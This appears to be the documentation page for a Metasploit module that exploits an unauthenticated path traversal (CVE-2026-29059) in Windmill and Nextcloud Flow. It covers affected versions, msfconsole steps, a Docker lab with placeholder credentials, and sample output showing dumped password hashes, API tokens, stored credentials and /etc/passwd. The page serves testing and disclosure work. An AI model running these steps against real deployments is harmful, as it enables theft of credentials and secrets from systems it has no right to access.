## Vulnerable Application

This module exploits an unauthenticated path traversal vulnerability (CVE-2026-29059) in Windmill and
Nextcloud Flow to read arbitrary files from the server.

**No authentication is required for exploitation on any deployment type.**

When PostgreSQL runs in the same container (common in Flow deployments or all-in-one setups),
this module can dump database contents directly from disk files using proper PostgreSQL heap parsing.
Schema and database OID are discovered dynamically from system catalogs (pg_database, pg_class, pg_attribute).

### Affected Versions

| Product            | Affected            | Fixed    |
|--------------------|---------------------|----------|
| Windmill           | v1.309.0 - v1.603.2 | v1.603.3 |
| Nextcloud Flow     | v1.0.0 - v1.2.2     | v1.3.0   |

### Supported Deployment Types

| Deployment   | Description                                  | Auth Required                |
|--------------|----------------------------------------------|------------------------------|
| Standalone   | Direct Windmill instance                     | None                         |
| Flow Proxy   | Nextcloud with Flow app (via Nextcloud API)  | None (jobs_u is PUBLIC)      |
| Flow Direct  | Direct access to Flow container              | None                         |

**Critical:** The `jobs_u` endpoint is registered with `access_level=0` (PUBLIC) in Flow's AppAPI route table.
This means **no Nextcloud authentication is required** to exploit the path traversal via the Nextcloud proxy!

## Verification Steps

1. Start msfconsole
2. `use auxiliary/gather/windmill_file_read`
3. `set RHOSTS <target>`
4. `set RPORT <port>`
5. `set ACTION DUMP_ALL`
6. `run`
7. You should see secrets, users, tokens, and resources in formatted tables

## Actions

### READ (default)

Read a single file from the target system.

### DUMP_SECRETS

Dump secrets from PostgreSQL `global_settings` table.

### DUMP_USERS

Dump users and password hashes from PostgreSQL `password` table.

### DUMP_TOKENS

Dump API tokens from PostgreSQL `token` table.

### DUMP_RESOURCES

Dump resources (credentials) from PostgreSQL `resource` table.

### DUMP_ALL

Execute all DUMP_* actions in sequence.

## Options

### FILEPATH

The absolute path of the file to read from the target system (default: `/etc/passwd`).
Only used with `ACTION=READ`.

### DATABASE

The PostgreSQL database name to dump (default: `windmill`).

## Lab Setup

### Windmill All-in-One (PostgreSQL in same container)

This lab enables testing the PostgreSQL DB dump actions.

Create `docker-compose.yml`:

```yaml
services:
  windmill:
    build: .
    container_name: windmill-allinone
    ports:
      - "8100:8000"
```

Create `Dockerfile`:

```dockerfile
FROM ghcr.io/windmill-labs/windmill:1.394.4
USER root
RUN apt-get update && apt-get install -y postgresql-15 postgresql-contrib-15 supervisor && rm -rf /var/lib/apt/lists/*
RUN mkdir -p /var/lib/postgresql/data && chown -R postgres:postgres /var/lib/postgresql && chmod 700 /var/lib/postgresql/data
USER postgres
RUN /usr/lib/postgresql/15/bin/initdb -D /var/lib/postgresql/data
RUN /usr/lib/postgresql/15/bin/pg_ctl -D /var/lib/postgresql/data -l /tmp/pg.log start && \
    sleep 2 && createdb windmill && psql -c "ALTER USER postgres PASSWORD 'changeme';" && \
    /usr/lib/postgresql/15/bin/pg_ctl -D /var/lib/postgresql/data stop
USER root
COPY supervisord.conf /etc/supervisor/conf.d/supervisord.conf
COPY init-testdata.sql /init-testdata.sql
COPY init-testdata.sh /init-testdata.sh
RUN chmod +x /init-testdata.sh
EXPOSE 8000
CMD ["/usr/bin/supervisord", "-c", "/etc/supervisor/conf.d/supervisord.conf"]
```

Create `supervisord.conf`:

```ini
[supervisord]
nodaemon=true
user=root

[program:postgresql]
command=/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data
user=postgres
autostart=true
autorestart=true
priority=1

[program:windmill]
command=/usr/local/bin/windmill
user=root
autostart=true
autorestart=true
environment=DATABASE_URL="postgres://postgres:changeme@localhost:5432/windmill?sslmode=disable",BASE_URL="http://localhost:8000",MODE="standalone"
priority=10
startsecs=5

[program:init-testdata]
command=/init-testdata.sh
user=postgres
autostart=true
autorestart=false
startsecs=0
priority=20
```

Create `init-testdata.sh`:

```bash
#!/bin/bash
until pg_isready -h localhost -U postgres -q; do sleep 1; done
until psql -U postgres -d windmill -c "SELECT 1 FROM password LIMIT 1" &>/dev/null; do sleep 2; done
psql -U postgres -d windmill -f /init-testdata.sql
```

Create `init-testdata.sql`:

```sql
-- Test users
INSERT INTO password (email, password_hash, super_admin, login_type) VALUES 
('admin@lab.local', '$argon2id$v=19$m=19456,t=2,p=1$salt$hash', true, 'password'),
('dev@lab.local', '$argon2id$v=19$m=19456,t=2,p=1$salt$hash', false, 'password')
ON CONFLICT (email) DO NOTHING;

-- Test tokens
INSERT INTO token (token, email, label, expiration) VALUES 
('AdminToken1234567890ABCDEFGHIJK', 'admin@lab.local', 'api', NOW() + INTERVAL '1 year')
ON CONFLICT (token) DO NOTHING;

-- Test resources with credentials
INSERT INTO resource (workspace_id, path, value, resource_type, description) VALUES 
('admins', 'f/db/prod', '{"host":"db.internal","user":"app","password":"SecretPass123!"}', 'postgresql', 'Production DB'),
('admins', 'f/aws', '{"access_key_id":"AKIAIOSFODNN7EXAMPLE","secret_access_key":"wJalrXUtnFEMI/K7MDENG"}', 'aws', 'AWS')
ON CONFLICT (workspace_id, path) DO NOTHING;

CHECKPOINT;
```

Build and start:

```bash
docker compose build && docker compose up -d
```

Wait ~15 seconds for initialization. Access: http://localhost:8100

## Scenarios

### Dumping All Data (All-in-One Lab)

```
msf6 > use auxiliary/gather/windmill_file_read
msf6 auxiliary(gather/windmill_file_read) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf6 auxiliary(gather/windmill_file_read) > set RPORT 8100
RPORT => 8100
msf6 auxiliary(gather/windmill_file_read) > set ACTION DUMP_ALL
ACTION => DUMP_ALL
msf6 auxiliary(gather/windmill_file_read) > run
[*] Running module against 127.0.0.1
[*] Target: Windmill Standalone
[*] PostgreSQL: /var/lib/postgresql/data/base/16384
[+] Found tables: workspace, usr, password, token, resource, global_settings
Secrets
=======

Name                        Value
----                        -----
automate_username_creation  true
custom_tags                 ["chromium"]

Users
=====

Email                Hash
-----                ----
admin@lab.local      $argon2id$v=19$m=19456,t=2,p=1$saltsaltsaltsalt$ha...
admin@windmill.dev   $argon2id$v=19$m=4096,t=3,p=1$oLJo/lPn/gezXCuFOEya...
developer@lab.local  $argon2id$v=19$m=19456,t=2,p=1$devsaltdevsalt00$de...
operator@lab.local   $argon2id$v=19$m=19456,t=2,p=1$opsaltopsaltops0$op...

API Tokens
==========

Email                Token                            Label
-----                -----                            -----
admin@lab.local      AdminToken1234567890ABCDEFGHIJK  admin_api_token
developer@lab.local  DevToken567890ABCDEFGHIJKLMNOPQ  dev_ci_token
operator@lab.local   OpsToken890ABCDEFGHIJKLMNOPQRST  ops_monitoring

Resources
=========

Path                  Keys
----                  ----
f/api/stripe_keys     secret_key, publishable_key
f/app_themes/theme_0  name, value
f/cloud/aws_keys      access_key_id, secret_access_key
f/db/postgres_prod    host, port, portuser
f/smtp/mailserver     host, port, portpass

[*] Auxiliary module execution completed
```

### Dumping Secrets Only

```
msf6 auxiliary(gather/windmill_file_read) > set ACTION DUMP_SECRETS
ACTION => DUMP_SECRETS
msf6 auxiliary(gather/windmill_file_read) > run
[*] Running module against 127.0.0.1
[*] Target: Windmill Standalone
[*] PostgreSQL: /var/lib/postgresql/data/base/16384
[+] Found tables: workspace, usr, password, token, resource, global_settings
Secrets
=======

Name                        Value
----                        -----
automate_username_creation  true
custom_tags                 ["chromium"]

[*] Auxiliary module execution completed
```

### Dumping Users

```
msf6 auxiliary(gather/windmill_file_read) > set ACTION DUMP_USERS
ACTION => DUMP_USERS
msf6 auxiliary(gather/windmill_file_read) > run
[*] Running module against 127.0.0.1
[*] Target: Windmill Standalone
[*] PostgreSQL: /var/lib/postgresql/data/base/16384
[+] Found tables: workspace, usr, password, token, resource, global_settings
Users
=====

Email                Hash
-----                ----
admin@lab.local      $argon2id$v=19$m=19456,t=2,p=1$saltsaltsaltsalt$ha...
admin@windmill.dev   $argon2id$v=19$m=4096,t=3,p=1$oLJo/lPn/gezXCuFOEya...
developer@lab.local  $argon2id$v=19$m=19456,t=2,p=1$devsaltdevsalt00$de...
operator@lab.local   $argon2id$v=19$m=19456,t=2,p=1$opsaltopsaltops0$op...

[*] Auxiliary module execution completed
```

### Reading /etc/passwd

```
msf6 > use auxiliary/gather/windmill_file_read
msf6 auxiliary(gather/windmill_file_read) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf6 auxiliary(gather/windmill_file_read) > set RPORT 8100
RPORT => 8100
msf6 auxiliary(gather/windmill_file_read) > set FILEPATH /etc/passwd
FILEPATH => /etc/passwd
msf6 auxiliary(gather/windmill_file_read) > set ACTION READ
ACTION => READ
msf6 auxiliary(gather/windmill_file_read) > run
[*] Running module against 127.0.0.1
[*] Target: Windmill Standalone
[+] Read 1071 bytes

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
postgres:x:999:999::/var/lib/postgresql:/bin/sh

[*] Auxiliary module execution completed
```
